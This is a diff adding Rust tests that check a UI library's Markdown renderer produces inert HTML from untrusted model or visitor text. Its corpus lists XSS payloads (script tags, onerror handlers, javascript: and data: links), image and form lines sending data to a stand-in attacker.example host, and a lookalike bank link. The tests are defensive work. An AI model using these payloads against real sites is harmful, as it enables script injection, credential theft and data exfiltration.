@@ -1299,3 +1299,157 @@ async fn markup_the_app_wrote_asks_for_no_more_than_four_either() {
         );
     }
 }
+
+// ---- Markdown ------------------------------------------------------------------------------
+//
+// UI-GENUI-024: text from a model or a visitor is Markdown, and Markdown must not be a way
+// to put markup, a script, a request to another site or a link to one into the page.
+
+/// Every `href` value in `html`.
+fn hrefs(html: &str) -> Vec<String> {
+    let mut found = Vec::new();
+    let mut rest = html;
+    while let Some(at) = rest.find("href=\"") {
+        rest = &rest[at + 6..];
+        let end = rest.find('"').unwrap_or(rest.len());
+        found.push(rest[..end].to_owned());
+        rest = &rest[end..];
+    }
+    found
+}
+
+/// What no output of Markdown may hold, whatever the text said.
+fn assert_markdown_is_inert(text: &str, html: &str) {
+    let lower = html.to_ascii_lowercase();
+    for bad in [
+        "<script", "<iframe", "<object", "<embed", "<style", "<svg", "<math", "<form", "<base",
+        "<meta", "<link", "<video", "<audio", "srcdoc=", "style=",
+    ] {
+        assert!(!lower.contains(bad), "{bad} from {text:?}: {html}");
+    }
+    // No attribute that runs code: ` on` and a name, then `=`, outside text.
+    for at in lower.match_indices(" on").map(|(at, _)| at) {
+        let name: String = lower[at + 1..]
+            .chars()
+            .take_while(char::is_ascii_alphabetic)
+            .collect();
+        let after = &lower[at + 1 + name.len()..];
+        assert!(
+            !(name.len() > 2 && after.starts_with('=') && html[..at].rfind('<') > html[..at].rfind('>')),
+            "an event attribute from {text:?}: {html}"
+        );
+    }
+    for href in hrefs(html) {
+        let ok = ["http://", "https://", "mailto:", "tel:", "/", "#", "?", ".", "//"]
+            .iter()
+            .any(|start| href.starts_with(start));
+        assert!(ok, "href {href:?} from {text:?}: {html}");
+        assert!(!href.to_ascii_lowercase().contains("javascript:"), "{href:?}");
+    }
+}
+
+#[test]
+fn markdown_turns_no_hostile_text_into_markup() {
+    let corpus = [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<iframe src=\"https://attacker.example\"></iframe>",
+        "<style>body{display:none}</style>",
+        "<meta http-equiv=\"refresh\" content=\"0;url=https://attacker.example\">",
+        "<base href=\"https://attacker.example/\">",
+        "<a href=\"javascript:alert(1)\">x</a>",
+        "<form action=\"https://attacker.example\"><input name=password></form>",
+        "<!-- --><script>alert(1)</script>",
+        "<![CDATA[<script>alert(1)</script>]]>",
+        "<math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<a href=\"x\" onclick=\"alert(1)\">x</a>",
+        "[x](javascript:alert(1))",
+        "[x](JaVaScRiPt:alert(1))",
+        "[x](&#x6A;avascript:alert(1))",
+        "[x](  javascript:alert(1))",
+        "[x](<javascript:alert(1)>)",
+        "[x](data:text/html,<script>alert(1)</script>)",
+        "[x](vbscript:msgbox(1))",
+        "[x](file:///etc/passwd)",
+        "[x][r]\n\n[r]: javascript:alert(1)",
+        "<javascript:alert(1)>",
+        "<https://attacker.example/steal>",
+        "![x](https://attacker.example/steal?d=secret)",
+        "![x][r]\n\n[r]: https://attacker.example/pixel.png",
+        "![x](javascript:alert(1))",
+        "![x](/internal/avatar.png?token=abc)",
+        "[![x](https://attacker.example/a.png)](https://attacker.example)",
+        "```\"><script>alert(1)</script>\ncode\n```",
+        "```rust\n</code></pre><script>alert(1)</script>\n```",
+        "| a |\n|---|\n| <script>alert(1)</script> |",
+        "- [x] <img src=x onerror=alert(1)>",
+        "# <script>alert(1)</script>",
+        "> <img src=x onerror=alert(1)>",
+        "\u{0}<script>alert(1)</script>",
+        "<scr<script>ipt>alert(1)</script>",
+        "<<script>script>alert(1)<</script>/script>",
+    ];
+    for text in corpus {
+        for markdown in [
+            navree_ui::Markdown::new(text),
+            navree_ui::Markdown::new(text).links_in_new_tab().copy_code(),
+            navree_ui::Markdown::trusted(text),
+        ] {
+            assert_markdown_is_inert(text, &markdown.to_html());
+        }
+    }
+}
+
+#[test]
+fn markdown_in_untrusted_text_draws_no_image_whatever_the_syntax() {
+    for text in [
+        "![x](https://attacker.example/steal?d=secret)",
+        "![x][r]\n\n[r]: https://attacker.example/pixel.png",
+        "![x](/internal/avatar.png?token=abc)",
+        "![x](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)",
+        "<img src=\"https://attacker.example/x.png\">",
+        "[![x](https://attacker.example/a.png)](/safe)",
+    ] {
+        let html = navree_ui::Markdown::new(text).to_html();
+        assert!(!html.contains("<img"), "{text:?}: {html}");
+        assert!(!html.contains("src="), "{text:?}: {html}");
+    }
+}
+
+#[test]
+fn a_link_that_says_one_site_and_goes_to_another_shows_where_it_goes() {
+    let html = navree_ui::Markdown::new("[https://yourbank.example/login](https://attacker.example/login)").to_html();
+    assert!(html.contains(r#"data-host="attacker.example""#), "{html}");
+    assert!(html.contains("nofollow"), "{html}");
+    // The user name trick shows the host after the `@`.
+    let html = navree_ui::Markdown::new("[x](https://yourbank.example@attacker.example/login)").to_html();
+    assert!(html.contains(r#"data-host="attacker.example""#), "{html}");
+}
+
+#[test]
+fn markdown_cannot_grow_without_a_bound() {
+    // Past the limit the text is cut, so the work and the page stay in proportion to it.
+    let big = "a *b* [c](/d) `e`\n\n".repeat(60_000);
+    assert!(big.len() > navree_ui::markdown::MAX_BYTES);
+    let html = navree_ui::Markdown::new(big).to_html();
+    assert!(html.contains("markdown-cut"), "the cut is said");
+    assert!(html.len() < navree_ui::markdown::MAX_BYTES * 6, "{}", html.len());
+    // Nesting is flattened, so the tree stays shallow, and the renderer writes all of it.
+    let nested = format!("{}end", "> ".repeat(5000));
+    let html = navree_ui::Markdown::new(nested).to_html();
+    assert!(html.contains("end"));
+    assert_eq!(html.matches("<blockquote>").count(), html.matches("</blockquote>").count());
+    let lists = format!("{}end", "- ".repeat(5000));
+    let html = navree_ui::Markdown::new(lists).to_html();
+    assert!(html.contains("end"));
+}
+
+#[test]
+fn a_code_block_escapes_its_code_and_cannot_close_its_own_element() {
+    let html = render(&navree_ui::CodeBlock::new("html", "</code></pre><script>alert(1)</script>").into());
+    assert!(!html.contains("<script"), "{html}");
+    assert_eq!(html.matches("<pre").count(), 1, "{html}");
+    assert_eq!(html.matches("</pre>").count(), 1, "{html}");
+}
